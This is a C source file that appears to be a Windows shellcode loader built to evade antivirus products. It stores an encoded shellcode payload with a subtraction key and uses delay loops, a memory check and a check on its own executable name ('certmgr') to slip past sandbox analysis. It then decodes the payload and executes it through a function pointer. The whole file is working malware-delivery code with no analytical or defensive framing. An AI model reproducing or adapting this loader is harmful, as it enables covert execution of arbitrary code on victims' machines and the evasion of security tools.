#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>

int compt1 = 0;
int compt2 = 0;
int longu = 0;
int position = 0;
int avEvade[100];
int longueur2 = 0;

#define MAX_OP 10000000
#define TOO_MUCH_MEM 10000

unsigned char code[] =
"\x30\xcb\x85\xea\x96\xec\xff\xff\xff\xff\xc1\x62\x88\x7c\x15\xac\xc3\xac\xec\x85\xf4\xfc\xe7\xfa\x87\xd\x32\x7\x3b\x2c\x5f\x19\x59\x41\x6b\xbd\x30\xbd\xaa\x6d\xa8\x26\x2f\x6f\x4c\x46\x4d\x1d\x20\x40\xd3\x86\x8d\x28\xbd\x95\xdd\xb\x8e\x3a\xaf\x87\x4e\x8d\xf1\x29\x9b\xf5\xca\x14\xac\x99\xfc\xfd\x25\x5a\x70\xe0\x68\x4a\x34\xd3\x60\xea\x4f\x4e\x94\x60\x40\xd3\xf8\x48\x28\xd2\x84\x4a\xa\x11\xfe\x44\x8b\x30\x88\x29\xd7\x43\xbf\x8c\xb3\xb6\x74\xb1\xef\x50\x5f\x5a\xc5\x3f\xa0\x2a\xb2\xee\x74\xfa\x54\x6\x94\x85\xa9\x3b\x38\x93\xca\x54\xc4\x84\x21\x14\x80\xaa\x60\x8a\x8a\xdf\x46\xb5\xc3\xd8\x7d\xfc\x64\xd0\x33\x82\xf5\xdb\x73\xc9\x45\xf9\x53\xc5\x18\xc\x27\x5d\x82\xab\x66\x90\xbb\xcd\xcd\x57\xe5\x91\xb1\x4e\xf6\x2a\x23\x8c\xaa\xdc\x51\xd9\x7d\xc5\x56\xe3\xd0\xc2\xc9\x3c\x82\xfe\x9e\x33\x15\x5f\x8f\xd3\xfd\xfe\x8f\x41\x15\x8a\xc4\x6\x92\x13\x79\x7f\xd5\x85\xb1\x61\x7f\xb0\x70\x6\x29\x97\xce\x14\xc3\x84\x17\x20\xf9\x2a\xc9\xf\x84\xfa\xa4\x8f\xb5\xd3\x6d\x5e\xb0\x9d\x1c\x5b\xa9\x11\xb6\x62\xb3\xb2\xc7\x12\x1e\x7b\x15\x70\xc4\xc8\x56\xa\x99\x85\x46\x39\xb3\xa4\x26\x56\x8e\xdb\x4d\xfc\x27\x53\xdf\x9\xf9\xf6\x6d\xce\xac\xad\x27\x32\x75\xa2\x4f\xfc\x27\xa1\x4a\x73\x32\x60\x4e\x12\x9a\xfe\x52\x8\x25\x7e\xaf\x55\xa3\xa9\x26\x47\xa6\xbd\x20\x73\x1c\xfb\x95\xe8\x12\x29\xdc\x70\xe7\xa9\x20\x6e\x6f\x57\x3e\x68\x18\x22\xca\xcc\x8a\xfe\xb4\x55\xf8\x86\xa6\xec\x96\xfb\x50\x9\x9e\xfd\x2d\x9\xa9\xa8\x29\x4\x2c\x42\x16\xfc\x29\x7e\xbb\x4\x95\xc9\xcf\x37\x9f\xba\x2a\x8\xe6\xf6\x4e\x5a\xa1\xf7\x2b\x64\x5d\xa8\xac\xfc\x26\x69\x20\x72\xf5\xa9\x1f\x57\x99\xfd\x95\xd1\xb6\xd\xa1\x82\x9\xfa\x32\x29\xa9\xa1\x56\x47\xf9\xfb\x2a\x4\xa3\xa2\x48\x34\xff\xca\xb7\xda\xad\xa3\x41\x6f\xbf\x9e\xb7\xd9\xb1\xac\xb3\x15\xdc\x25\x42\xfe\x14\xc\x4d\xc4\xda\x34\x3c\xcc\x34\x50\xc3\xba\x54\xab\x2b\x6\xab\x14\x9b\x9\xf3\xfd";

int num[] =
{5,2,2,1,2,4,0,0,0,0,1,4,7,6,7,3,2,3,4,2,6,0,5,6,5,5,8,6,8,3,9,2,3,3,2,7,8,6,3,4,9,5,2,4,5,9,2,1,5,2,9,1,5,9,7,2,6,3,5,8,6,6,7,2,3,7,2,6,4,9,1,1,0,5,6,5,7,7,5,7,4,5,4,8,1,7,2,7,6,3,1,9,7,5,6,2,7,4,0,6,5,4,6,1,2,8,2,3,8,4,1,1,2,7,1,6,1,7,1,7,1,3,2,6,7,3,4,8,1,9,8,3,4,1,4,5,2,5,5,4,7,2,8,3,4,1,9,6,1,0,8,8,7,3,3,3,6,7,6,0,7,1,6,6,8,9,7,5,9,8,1,5,7,8,4,5,3,3,5,5,7,4,1,8,5,9,2,8,1,3,6,5,3,5,7,9,3,1,6,7,3,7,0,9,5,6,5,9,9,6,5,7,3,1,1,4,8,6,4,4,7,4,6,5,8,5,8,5,2,1,8,3,3,8,9,5,7,5,1,3,4,6,5,8,8,2,8,6,9,6,4,4,1,1,3,2,5,5,1,2,9,7,1,2,8,8,4,4,1,7,7,9,3,0,2,7,2,7,9,2,9,7,8,9,2,8,5,3,2,0,2,3,2,8,2,4,2,5,2,8,5,1,3,1,4,2,3,5,9,4,6,9,3,8,2,0,3,5,3,8,2,7,7,7,6,3,6,6,5,6,9,1,2,9,6,0,2,8,0,5,5,1,5,7,3,6,4,9,6,2,3,5,4,3,3,6,4,0,4,7,6,1,7,7,9,2,5,6,5,5,6,2,1,5,7,3,6,9,9,1,4,0,1,2,2,9,5,7,1,3,1,7,1,6,7,2,9,2,1,6,2,8,1,5,9,4,9,7,3,1,3,6,2,8,0,6,5,4,6,7,9,2,2,9,5,3,3,2,1,6,8,8,6,2,5,1,1,4,1,2,4,8,1,1,6,4,2,9,4,3,8,9,3,6,3,9
};

int var12;
int (*ret)() = (int(*)())code;


int main(int argc, char *argv[])
{
int cpt = 0;
int i = 0;
for(i =0; i < MAX_OP; i ++)
{
    cpt++;
}
if(cpt == MAX_OP)
{
//HWND hwnd=GetForegroundWindow ();
//ShowWindow (hwnd,SW_HIDE);

char
* memdmp = NULL;
memdmp =
(char*) malloc(TOO_MUCH_MEM);
if
(memdmp!=NULL)
{

if
(strstr(argv[0], "certmgr") >0)
{

    if(strstr(argv[0],"certmgr"))
        {
	var12=strlen(code);
	while (compt2<98000)
		    {
			compt2 += 1;
			}
		while(position<var12)
			{
				code[position] = code[position] - num[position];
				position++;
			}
		printf("%x",code);
		printf("Execution en cours ...");

		ret();

	}
		return 0;
	}
		return 0;
	}
}

return 0;
}

